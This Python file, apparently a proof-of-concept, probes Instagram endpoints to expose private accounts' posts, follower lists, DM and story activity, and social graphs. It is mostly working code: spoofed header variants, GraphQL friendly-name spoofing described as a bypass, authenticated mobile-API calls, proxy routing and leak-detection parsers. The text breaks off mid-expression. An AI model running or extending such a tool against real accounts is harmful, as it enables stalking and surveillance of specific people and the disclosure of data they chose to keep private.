"""
Instagram Private Account Disclosure - PoC v2.1

v1 silently failed when timeline markers were missing. v2 widened the probe
matrix so negative results are informative. v2.1 follows up on what v2 found:
  - if web_profile_info reveals a numeric user_id, Phase 3/4 hit the
    uid-keyed mobile-API endpoints (these were referenced by the polaris HTML
    preloader config and sometimes don't share the web profile route's gating)
  - HTML responses are clustered by SHA256; singletons are flagged as
    anomalies and auto-saved (the desktop-Chrome+hl=tr 933 KB outlier
    on the previous run was the trigger for adding this)
  - 4 new header variants exercise slow-network hints (Downlink/RTT/ECT)
    + the desktop+TR combination that caused the size anomaly

Probe phases (when all features enabled):
  Phase 1: unauth username-keyed (HTML × suffix, then 2 username-API)
  Phase 2: auth username-keyed (same shape, with cookies)
  Phase 3: unauth uid-keyed   (6 endpoints × 3 mobile variants)
  Phase 4: auth uid-keyed

Endpoints
  HTML:                   /<u>/, /<u>/?hl=en, /<u>/?hl=tr, /<u>/reels/, /<u>/tagged/
  Username API:           /api/v1/users/web_profile_info/?username=<u>
                          /api/v1/feed/user/<u>/username/?count=12
  UID API (Phase 3/4):    /api/v1/users/<uid>/info/
                          /api/v1/feed/user/<uid>/?count=12
                          /api/v1/highlights/<uid>/highlights_tray/
                          /api/v1/feed/reels_media/?reel_ids=<uid>
                          /api/v1/friendships/show/<uid>/
                          /api/v1/clips/user/?target_user_id=<uid>&page_size=12

CLI flags
  --reverse     Phase 18: reverse-chaining sweep. Phase 17 çıktısındaki N
                komşunun her birinde target_pk'yi geriye doğru arar +
                2. derece sosyal grafı (frequency-sıralı) çıkarır. Lean: 5
                yüksek-değer modül × N komşu (~2-3 dk). --full ile 15 modül.
                Bağımlılık: Phase 17 daha önce koşmuş olmalı (lean'de oto).
  --dm          Phase 19: DM precheck (9 endpoint, web XHR + mobile pigeon).
                Friendship/block state, inbox thread varlığı + ts, notes
                audience, get_by_participants reachability + responsiveness.
                Aggregate -> artifacts/<u>/dm_precheck.json.
  --activity    Phase 20: Activity & Interaction Forensics. Phase 19'dan
                farklı yeni veri sınıfları: news_inbox mining (target son
                90 gün viewer ile etkileşim), reels_tray last_seen (target
                story aktivite ts), own-story viewer harvest (target seen_at
                deterministik), e2ee/vanish capabilities, direct initial_load
                (tüm thread last_seen). -> activity_forensics.json.
  --signal      Phase 21: HIGH-SIGNAL izole endpoints. Viewer aktivitesinden
                bağımsız 18 endpoint: AYML/topical/clips discover seed (target
                etrafında cluster), past_live_broadcasts, pinned_media,
                fundraisers, imagine_widget, account_transparency, channels,
                roll_call, broadcast_consumption, family_center,
                multiple_accounts family, notes_seen_state, usertags_feed.
                -> high_signal.json.
  --deep        Phase 22 v3: DEEP PIGEON BYPASS. i.instagram.com + pigeon
                header. 11 endpoint (deprecated olanlar çıkarıldı): users/
                lookup signed_body, info aşırı include, info_via_barcelona,
                story/reel/highlights, mutual_followers, web_profile_info
                TAM 30+ field dump, account_family, info_via_restrict 208
                field tam parse, clips POST. -> deep_pigeon.json.
  --bloks       Phase 23: BLOKS FRAMEWORK PROBE. IG mobile app'in Bloks UI
                render endpoint'leri (10 app). REST'te olmayan UI data:
                profile menu, action sheet, restrict/block sheet, DM options,
                user appeal form, account security menu, profile shop,
                creator marketplace. Her yanıt nested action tree'sinde
                eligibility/menu items/warning texts/report categories
                içerir. -> bloks_probe.json.
  --gql         Phase 24: GRAPHQL FRESH + FRIENDLY-NAME SPOOF. Live HTML'den
                fresh doc_id'leri çıkarıp 10 Polaris query'yi 6 farklı
                friendly_name (LoggedOut/Restricted/Direct spoof dahil) ×
                3 variable shape ile POST eder. IG GraphQL gating policy'si
                friendly_name'e bakar; LoggedOut variant en gevşek policy
                uygular → private feed/followers/following edge'lerinde
                LEAK olabilir. Yeni saldırı yüzeyi: REST namespace'i değil
                /graphql/query/ kanalı. -> graphql_fresh.json.
  --auth        load cookies from ../.env
  --all         do not stop on first hit (full matrix)
  --save        write every response under artifacts/<username>/ for diffing
  --warm        seed a session via instagram.com/ before probing (mimics browser)
  --full        opt-in to ALL diagnostic phases. Default is LEAN (~30 requests):
                only the phases that actually return data — HTML profile root
                for token harvest, web_profile_info for pk discovery, mobile
                pigeon /users/{pk}/info/ for the 60KB rich response (chaining
                + critical_intel + dm_layer), and module-hint sweep (93+
                unique cluster accounts). With --full (~530 requests), also
                includes confirmed-dead-weight phases (UID endpoints, GraphQL
                replay with stale doc_ids, Wayback/oEmbed unreachable,
                trigger-state header corruption with 0 leaks, nav-chain with
                no effect, TLS impersonation, real browser).
  --api         skip HTML phase, hit only the API surfaces
  --html-only   skip every API phase
  --no-uid      skip Phase 3/4 even if user_id was discovered
  --proxy URL   route all probes through an HTTP/SOCKS proxy. Required to
                emulate the original report's residential Indian mobile IP
                conditions; without a matching egress, IG's gating likely
                kicks in regardless of headers.

Network conditions
  - Forces accept-encoding=br,gzip,deflate (no zstd). The original leaking
    responses returned Content-Encoding: br; modern requests advertises zstd
    by default and IG replies with zstd, which appears to be a different
    (gated) render path.
  - Cohort profile: extracts is_private/follower_count/media_count/has_email/
    has_phone from web_profile_info and compares against the original report's
    vulnerable cohort (old organic accounts >= ~2 years, linked email, no 2FA,
    not Meta-test).

Backward compat: extract_timeline_data, extract_all_image_urls_recursive,
decode_url, save_urls_to_file keep their original signatures (imported by
test_with_cookies.py and probe_html.py).
"""

import os
import re
import sys
import json
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote, urljoin, urlparse
from collections import defaultdict


IG_WEB_APP_ID = "936619743392459"
IG_MOBILE_APP_ID = "567067343352427"

BACKEND_DIR = os.path.dirname(os.path.abspath(__file__))
APP_DIR = os.path.dirname(BACKEND_DIR)
ARTIFACT_ROOT = os.environ.get(
    'IG_ARTIFACT_ROOT', os.path.join(APP_DIR, 'data', 'artifacts'))


def _have_decoder(name):
    try:
        __import__(name)
        return True
    except ImportError:
        return False


HAVE_BROTLI = _have_decoder('brotli') or _have_decoder('brotlicffi')
HAVE_ZSTD = _have_decoder('zstandard')
HAVE_CURL_CFFI = _have_decoder('curl_cffi')
HAVE_HTTPX = _have_decoder('httpx')
HAVE_PLAYWRIGHT = _have_decoder('playwright')

                                                                               
                                                                             
                                                                           
                                                                             
                                                                      
if HAVE_BROTLI:
    ACCEPT_ENCODING = 'br, gzip, deflate'
else:
    ACCEPT_ENCODING = 'gzip, deflate'

                                                                             
                                                                            
                                                        
SLOW_NET_PROFILES = {
    'slow-2g': {'downlink': '0.05', 'rtt': '2000'},
    '2g':      {'downlink': '0.5',  'rtt': '1400'},
    '3g':      {'downlink': '1.0',  'rtt': '270'},
    '4g':      {'downlink': '5.0',  'rtt': '50'},
}

                                                                       
                                                                      
                                                                     
                                                                           
                                                                            
                                            
                                       
                                                                         
                                                                     
                                                                         
                                                                          
                                                                           
                                   
 
                                                                       
                                                                       
                                                                     
                                                                         

COUNT_PARSERS = [
                                                                  
    ('og_description',
     r'(\d[\d,]*)\s+followers?,\s+(\d[\d,]*)\s+following,\s+(\d[\d,]*)\s+posts?'),
                        
    ('edge_count',
     r'"edge_followed_by"\s*:\s*\{\s*"count"\s*:\s*(\d+)\s*\}.*?'
     r'"edge_follow"\s*:\s*\{\s*"count"\s*:\s*(\d+)\s*\}.*?'
     r'"edge_owner_to_timeline_media"\s*:\s*\{\s*"count"\s*:\s*(\d+)'),
               
    ('flat_counts',
     r'"follower_count"\s*:\s*(\d+).*?"following_count"\s*:\s*(\d+).*?'
     r'"media_count"\s*:\s*(\d+)'),
]


def extract_profile_counts(text):
    """Returns (followers, following, posts) as ints, or None if no parser
    matched. Tries multiple patterns to handle the "lite" 799KB render that
    omits og:description but still embeds counts elsewhere."""
    for parser_name, pat in COUNT_PARSERS:
        m = re.search(pat, text, re.DOTALL)
        if m:
            try:
                vals = [int(g.replace(',', '')) for g in m.groups()]
                if len(vals) == 3:
                    return tuple(vals) + (parser_name,)
            except ValueError:
                continue
    return None


def detect_trigger_state(scan, counts, baseline_counts):
    """Returns ('reason', 'detail') tuple if the response looks like the
    corrupted-state bug pattern, else None.
    Conditions (any one):
      A. counts == (0,0,0) AND baseline non-zero  (count zeroing)
      B. counts.followers == 0 but counts.posts > 0 (partial corruption)
      C. counts deviate >50% from baseline
    Combined with edges_filled or feed_urls = full leak signature.
    """
    if counts is None:
        return None
    f, fol, p = counts[0], counts[1], counts[2]
    bf, bfol, bp = (baseline_counts[0], baseline_counts[1], baseline_counts[2]) \
                    if baseline_counts else (None, None, None)

    is_zero = (f == 0 and fol == 0)
    edges_or_urls = (
        scan.get('photo_urls', 0) > 0
        or any(p['edges_count'] > 0 and p['has_image_versions2']
                for p in scan.get('preloaders', []))
    )

    if is_zero and edges_or_urls:
        return ('TRIGGER_STATE_LEAK',
                f'counts=(0,0,{p}) edges/urls populated - corrupted-state bug')
    if is_zero and bf and bf > 0:
        return ('count_zeroing_no_leak',
                f'counts=(0,0,{p}) but baseline=({bf},{bfol},{bp}) - state corrupted, edges still gated')
    if bf and bf > 0:
        f_dev = abs(f - bf) / max(bf, 1) if bf else 0
        if f_dev > 0.5:
            return ('count_deviation',
                    f'followers={f} (baseline={bf}, dev={f_dev*100:.0f}%)')
    return None


                                                                             
                                                                            
                                                                           
                                                           
TRIGGER_PROBE_COMBOS = [
    ('nexus5_vw503_savedata_baseline', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '503', 'save-data': 'on'}),
    ('mobile_ua_desktop_chua', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
        'viewport-width': '1000'}),
    ('mobile_huge_viewport', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '99999'}),
    ('viewport_zero', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '0'}),
    ('viewport_negative', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '-100'}),
    ('viewport_fractional', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '503.5'}),
    ('save_data_multivalue', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '503', 'save-data': 'on, off, on'}),
    ('contradictory_bandwidth', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '503', 'ect': '4g', 'downlink': '0.0', 'rtt': '99999'}),
    ('chua_future_version', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform-version': '"99.0.0"',
        'viewport-width': '503'}),
    ('android_4_old', {
        'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; Nexus 7 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '503'}),
    ('opera_mini', {
        'user-agent': 'Opera/9.80 (Android; Opera Mini/63.0.2254/191.297; U; en) Presto/2.12.423 Version/12.16',
        'viewport-width': '240'}),
    ('windows_phone_firefox', {
        'user-agent': 'Mozilla/5.0 (Mobile; rv:32.0) Gecko/32.0 Firefox/32.0',
        'viewport-width': '320'}),
    ('instagram_native_app', {
        'user-agent': 'Instagram 269.0.0.18.75 Android (33/13; 420dpi; 1080x2280; samsung; SM-G998B; o1s; exynos2100; en_US; 442089772)',
        'viewport-width': '1080'}),
    ('mobile_no_chua_no_dpr', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '503', 'no_chua': True, 'no_dpr': True}),
    ('mobile_dpr_extreme', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '503', 'dpr': '99'}),
    ('savedata_truncated_at_3', {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '503', 'save-data': 'on'},
                                                                
    ),
]


NAV_CHAINS = {
    'none':          None,
    'cold_start':    'PolarisProfilePostsTabRoot:profilePage:1:cold-start',
    'topnav_link':   'PolarisProfilePostsTabRoot:profilePage:2:topnav-link',
    'unexpected':    'PolarisProfilePostsTabRoot:profilePage:3:unexpected',
    'user_provided': ('PolarisProfilePostsTabRoot:profilePage:2:topnav-link,'
                       'PolarisProfilePostsTabRoot:profilePage:3:unexpected'),
    'feed_to_prof':  ('PolarisFeedRoot:feedPage:1:cold-start,'
                       'PolarisProfilePostsTabRoot:profilePage:2:topnav-link'),
    'mention_click': 'PolarisProfilePostsTabRoot:profilePage:2:mention-click',
    'notif_click':   ('PolarisActivityFeedRoot:activity:1:cold-start,'
                       'PolarisProfilePostsTabRoot:profilePage:2:notification-click'),
}


                                                        
                                                                               
                                                             
                                                                                
HEADER_VARIANTS = [
    {
        'name': 'nexus5_vw503_savedata',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform-version': '"6.0"',
        'viewport-width': '503',
        'save-data': 'on',
        'accept-language': 'en-GB,en;q=0.9',
        'mobile': True,
    },
    {
        'name': 'desktop_chrome_vw1280',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'viewport-width': '1280',
        'save-data': None,
        'accept-language': 'en-US,en;q=0.9',
        'mobile': False,
    },
]

                                                                               
                                                                               
                                                                              
FULL_HEADER_VARIANTS_EXTRA = [
    {
        'name': 'nexus5_vw1000',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform-version': '"6.0"',
        'viewport-width': '1000',
        'save-data': None,
        'accept-language': 'en-GB,en;q=0.9',
        'mobile': True,
    },
    {
        'name': 'pixel7_vw412_savedata',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-model': '"Pixel 7"',
        'sec-ch-ua-platform-version': '"13.0.0"',
        'viewport-width': '412',
        'save-data': 'on',
        'accept-language': 'en-GB,en;q=0.9',
        'mobile': True,
    },
    {
        'name': 'pixel6_vw360_savedata',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-model': '"Pixel 6"',
        'sec-ch-ua-platform-version': '"13.0.0"',
        'viewport-width': '360',
        'save-data': 'on',
        'accept-language': 'en-GB,en;q=0.9',
        'mobile': True,
    },
    {
        'name': 'galaxy_vw720_savedata_light',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-model': '"SM-S918B"',
        'sec-ch-ua-platform-version': '"14.0.0"',
        'viewport-width': '720',
        'save-data': 'on',
        'accept-language': 'en-GB,en;q=0.9',
        'sec-ch-prefers-color-scheme': 'light',
        'mobile': True,
    },
    {
        'name': 'nexus5_vw503_savedata_tr',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform-version': '"6.0"',
        'viewport-width': '503',
        'save-data': 'on',
        'accept-language': 'tr-TR,tr;q=0.9,en;q=0.8',
        'mobile': True,
    },
    {
        'name': 'desktop_firefox_vw1280',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'viewport-width': '1280',
        'save-data': None,
        'accept-language': 'en-US,en;q=0.5',
        'mobile': False,
        'no_client_hints': True,
    },
    {
        'name': 'crawler_facebookexternalhit',
        'user-agent': 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
        'viewport-width': '1024',
        'save-data': None,
        'accept-language': 'en-US,en;q=0.9',
        'mobile': False,
        'no_client_hints': True,
    },
                                                                
    {
        'name': 'pixel6_vw360_savedata_slow2g',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-model': '"Pixel 6"',
        'sec-ch-ua-platform-version': '"13.0.0"',
        'viewport-width': '360',
        'save-data': 'on',
        'accept-language': 'en-GB,en;q=0.9',
        'mobile': True,
        'slow_network': 'slow-2g',
    },
    {
        'name': 'nexus5_vw503_savedata_2g_tr',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform-version': '"6.0"',
        'viewport-width': '503',
        'save-data': 'on',
        'accept-language': 'tr-TR,tr;q=0.9,en;q=0.8',
        'mobile': True,
        'slow_network': '2g',
    },
    {
                                                                         
                                                                            
        'name': 'desktop_chrome_vw1280_tr_3g',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'viewport-width': '1280',
        'save-data': 'on',
        'accept-language': 'tr-TR,tr;q=0.9,en;q=0.8',
        'mobile': False,
        'slow_network': '3g',
    },
    {
        'name': 'desktop_chrome_vw1280_tr_savedata',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'viewport-width': '1280',
        'save-data': 'on',
        'accept-language': 'tr-TR,tr;q=0.9,en;q=0.8',
        'mobile': False,
    },
]


                                                                     
                                                                          
                                                                        
                                                                     
HTML_ENDPOINT_SUFFIXES = [
    ('root', '/'),
]

                   
FULL_HTML_ENDPOINT_SUFFIXES_EXTRA = [
    ('hl_en', '/?hl=en'),
    ('hl_tr', '/?hl=tr'),
    ('reels', '/reels/'),
    ('tagged', '/tagged/'),
    ('embed', '/embed/'),
    ('embed_captioned', '/embed/captioned'),
    ('a1_legacy', '/?__a=1&__d=dis'),
    ('feed_path', '/feed/'),
    ('channel_path', '/channel/'),
]


TIMELINE_MARKERS = (
    'polaris_timeline_connection',
    'edge_owner_to_timeline_media',
    'xig_user_by_igid_v2',
    'XIGPolarisImageMedia',
)

PARTIAL_LEAK_MARKERS = (
    'image_versions2',
    'display_uri',
    'display_url',                                                      
    'XIGPolarisImageMedia',
    'XIGPolarisVideoMedia',
    'EmbedSimpleMedia',                                                   
)

EMPTY_TIMELINE_MARKER = 'polaris_timeline_connection":{"edges":[]'

                                                                           
                                                                            
                                                                 
                                                                      
                                                                       
                                                              
                                                                       
                                                                            
                                                                           
                                                                        
                                                                      
                   
COHORT_NOTE = (
    "leak in original report required: residential Indian mobile IP + "
    "older organic account (>= ~2 years old, linked email, no 2FA, no Meta-test flags)"
)

                                                                      
                                                      
                                                                           
                                                                              
                                                      
                                                                            
                                                                           
                                             
PHOTO_CDN_PATTERN = re.compile(
    r'https?:\\?/\\?/scontent[a-z0-9.-]*\.cdninstagram\.com\\?/v\\?/'
    r'(?:t51\.\d+-15|t50\.\d+-\d+)'
    r'\\?/[^"\'\s<>\\]+',
    re.IGNORECASE,
)
                                                                             
                                                                         
PROFILE_PIC_PATTERN = re.compile(
    r'https?:\\?/\\?/scontent[a-z0-9.-]*\.cdninstagram\.com\\?/v\\?/'
    r't51\.\d+-19\\?/[^"\'\s<>\\]+',
    re.IGNORECASE,
)

LOGIN_WALL_MARKERS = (
    'See full profile in the app',
    'Log in to see',
    'loginForm',
    'login_redirect',
    'PolarisLoggedOutPagesContainer',
)

                                                                              
                                                                      
                                                                                                       
                                                                                 
                                                                              
                                         
POLARIS_FEED_QUERIES = (
    'PolarisProfilePostsTabContentQuery',
    'PolarisProfilePostsLoggedOutTabContentQuery',
    'PolarisProfilePostsRestrictedQuery',
    'PolarisProfilePostsDirectQuery',
    'PolarisProfileReelsTabContentQuery',
    'PolarisProfileReelsTabContentDirectQuery',
    'PolarisProfileTaggedPostsTabContentQuery',
)


def _find_balanced_json(text, start_idx):
    """Returns the JSON object starting at the first '{' >= start_idx,
    using brace counting (handles strings, escapes)."""
    i = text.find('{', start_idx)
    if i < 0:
        return None, None
    depth = 0
    in_str = False
    esc = False
    for j in range(i, len(text)):
        c = text[j]
        if in_str:
            if esc:
                esc = False
            elif c == '\\':
                esc = True
            elif c == '"':
                in_str = False
        else:
            if c == '"':
                in_str = True
            elif c == '{':
                depth += 1
            elif c == '}':
                depth -= 1
                if depth == 0:
                    return i, j + 1
    return i, None


def extract_polaris_preloaders(text):
    """For each adp_*RelayPreloader_<id> entry whose query class matches a
    profile-feed query, parse its associated __bbox object and report:
        complete           — IG flagged the cache entry as fully populated
        edges_count        — how many post nodes are in polaris_timeline_connection.edges
        has_image_versions2 — whether image_versions2 (post media) is present
    A real leak is complete=true AND edges_count > 0 AND has_image_versions2.
    A gated-but-served preloader is complete=false (or edges_count=0) — the
    structural marker is there, but IG removed the data on the server side."""
    results = []
    for m in re.finditer(r'"(adp_(\w+?)RelayPreloader_\w+)"', text):
        key, query_class = m.group(1), m.group(2)
        if not any(q in query_class for q in POLARIS_FEED_QUERIES):
            continue
                                                                        
        start, end = _find_balanced_json(text, m.end())
        bbox = text[start:end] if start is not None and end is not None else ''
        complete = '"complete":true' in bbox
        has_iv2 = 'image_versions2' in bbox
                                                                      
        edges_count = 0
        em = re.search(r'"edges"\s*:\s*\[(.*?)\](?=,|\s*\})', bbox, re.DOTALL)
        if em:
            edges_count = em.group(1).count('"node"')
        results.append({
            'key': key,
            'query_class': query_class,
            'complete': complete,
            'edges_count': edges_count,
            'has_image_versions2': has_iv2,
            'bbox_len': len(bbox),
        })
    return results


def build_headers(variant, nav_chain=None):
                                                                             
                                                                                
                                                                             
                                                                       
                                                   
    h = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': ACCEPT_ENCODING,
        'accept-language': variant.get('accept-language', 'en-GB,en;q=0.9'),
        'priority': 'u=0, i',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': variant['user-agent'],
        'viewport-width': variant['viewport-width'],
        'dpr': '1',
    }
    if not variant.get('no_client_hints'):
        mobile_flag = '?1' if variant.get('mobile') else '?0'
        platform = '"Android"' if variant.get('mobile') else '"Windows"'
        h.update({
            'sec-ch-prefers-color-scheme': variant.get('sec-ch-prefers-color-scheme', 'dark'),
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.56", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.56"',
            'sec-ch-ua-mobile': mobile_flag,
            'sec-ch-ua-model': variant.get('sec-ch-ua-model', '""'),
            'sec-ch-ua-platform': platform,
            'sec-ch-ua-platform-version': variant.get('sec-ch-ua-platform-version', '"15.0.0"'),
        })
    if variant.get('save-data'):
        h['save-data'] = variant['save-data']
    if variant.get('slow_network') in SLOW_NET_PROFILES:
        ect = variant['slow_network']
        h['ect'] = ect
        h['downlink'] = SLOW_NET_PROFILES[ect]['downlink']
        h['rtt'] = SLOW_NET_PROFILES[ect]['rtt']
    if nav_chain:
        h['x-ig-nav-chain'] = nav_chain
    return h


def load_env_cookies():
    """Loads IG auth cookies from the app/workspace .env file.

    Only IG_SESSIONID and IG_DS_USER_ID
    are required; if any of csrftoken / mid / ig_did / datr are missing, we
    auto-fetch them by warming a session against instagram.com/ (where IG sets
    them via Set-Cookie headers). Returns None only if the truly-required
    keys are missing."""
    env_candidates = [
        os.environ.get('IG_ENV_FILE'),
        os.path.join(APP_DIR, '.env'),
    ]
    env_path = next((p for p in env_candidates if p and os.path.isfile(p)), None)
    if not env_path:
        return None
    env = {}
    with open(env_path, encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#') or '=' not in line:
                continue
            k, v = line.split('=', 1)
            v = v.strip()
            if len(v) >= 2 and v[0] == v[-1] and v[0] in "'\"":
                v = v[1:-1]
            env[k.strip()] = v

                                                                              
                                                                         
    if not env.get('IG_SESSIONID') or not env.get('IG_DS_USER_ID'):
        return None

    cookies = {
        'sessionid':  env['IG_SESSIONID'],
        'ds_user_id': env['IG_DS_USER_ID'],
        'csrftoken':  env.get('IG_CSRFTOKEN', ''),
        'mid':        env.get('IG_MID', ''),
        'ig_did':     env.get('IG_IG_DID', ''),
        'datr':       env.get('IG_DATR', ''),
    }

                                                                   
    missing = [k for k in ('csrftoken', 'mid', 'ig_did', 'datr') if not cookies[k]]
    if missing:
        try:
            ws = requests.Session()
            for k, v in cookies.items():
                if v:
                    ws.cookies.set(k, v, domain='.instagram.com')
            r = ws.get('https://www.instagram.com/',
                        headers={'user-agent':
                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                  'AppleWebKit/537.36 (KHTML, like Gecko) '
                                  'Chrome/141.0.0.0 Safari/537.36'},
                        timeout=20)
            for k in missing:
                v = ws.cookies.get(k)
                if v:
                    cookies[k] = v
            still_missing = [k for k in missing if not cookies[k]]
            if still_missing:
                print(f"[!] cookies still missing after warmup: {still_missing}; "
                      f"using empty defaults (some endpoints may 401)")
            else:
                print(f"[+] auto-fetched missing cookies via warmup: {missing}")
        except requests.exceptions.RequestException as e:
            print(f"[!] warmup failed ({type(e).__name__}); using cookies as-is")

    return cookies


def response_signature(r):
    h = r.headers
    csp = h.get('content-security-policy', '')
    nonce_match = re.search(r"'nonce-([^']+)'", csp)
    return {
        'status': r.status_code,
        'bytes': len(r.content),
        'x-fb-debug': h.get('x-fb-debug', '')[:24] + ('...' if len(h.get('x-fb-debug', '')) > 24 else ''),
        'content-encoding': h.get('content-encoding', '-'),
        'csp-nonce': nonce_match.group(1) if nonce_match else '-',
                                                                           
                                         
        'www-claim-present': bool(h.get('x-ig-set-www-claim')),
    }


_SAFE_RESPONSE_HEADERS = frozenset({
    'cache-control', 'content-encoding', 'content-length', 'content-type',
    'date', 'etag', 'expires', 'last-modified', 'vary',
})


def safe_response_headers(headers):
    """Return diagnostic response metadata without session material.

    Instagram may refresh authorization, cookies, device identifiers and
    routing claims in response headers. An allowlist is safer than trying to
    enumerate every sensitive header name.
    """
    return {
        str(key): str(value)
        for key, value in dict(headers or {}).items()
        if str(key).lower() in _SAFE_RESPONSE_HEADERS
    }


def scan_markers(text):
    full = sum(1 for m in TIMELINE_MARKERS if m in text)
    partial = sum(1 for m in PARTIAL_LEAK_MARKERS if m in text)
    walls = [m for m in LOGIN_WALL_MARKERS if m in text]
    photo_urls = len(PHOTO_CDN_PATTERN.findall(text))
    avatar_urls = len(PROFILE_PIC_PATTERN.findall(text))
    empty_timeline = EMPTY_TIMELINE_MARKER in text
    preloaders = extract_polaris_preloaders(text)
                                                                         
                                                                  
    leaking_preloaders = [
        p for p in preloaders
        if p['complete'] and p['edges_count'] > 0 and p['has_image_versions2']
    ]
                                                                            
                                                                              
    gated_preloaders = [
        p for p in preloaders
        if not p['complete'] or p['edges_count'] == 0
    ]
    has_feed_media = 'image_versions2' in text or photo_urls > 0
    real_hit = bool(leaking_preloaders) or (
        has_feed_media and not (empty_timeline and photo_urls == 0
                                 and 'image_versions2' not in text)
